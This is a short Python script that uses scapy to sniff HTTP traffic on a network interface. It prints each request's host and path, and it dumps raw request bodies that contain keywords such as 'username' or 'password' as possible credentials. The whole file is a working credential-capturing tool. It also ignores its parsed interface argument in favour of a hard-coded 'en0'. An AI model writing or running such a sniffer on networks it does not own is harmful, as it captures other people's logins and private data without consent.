import scapy.all as scapy
import argparse
from scapy.layers import http
def get_interface():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interface", dest="interface", help="Specify interface on which to sniff packets")
    arguments = parser.parse_args()
    return arguments.interface

def sniff(iface):
    scapy.sniff(iface=iface, store=False, prn=process_packet)

def process_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        print(f"[+] Http Request >> {packet[http.HTTPRequest].Host}  {packet[http.HTTPRequest].Path}")
        if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load
            keys = ["username", "password", "pass", "email"]
            for key in keys:
                if key.encode() in load:  # Convert key to bytes
                    print(f"\n\n\n[+] Possible password/username >>  + {load.decode(errors='ignore')} + \n\n\n")  # Decode load for printing
                    break

iface = get_interface()

sniff("en0")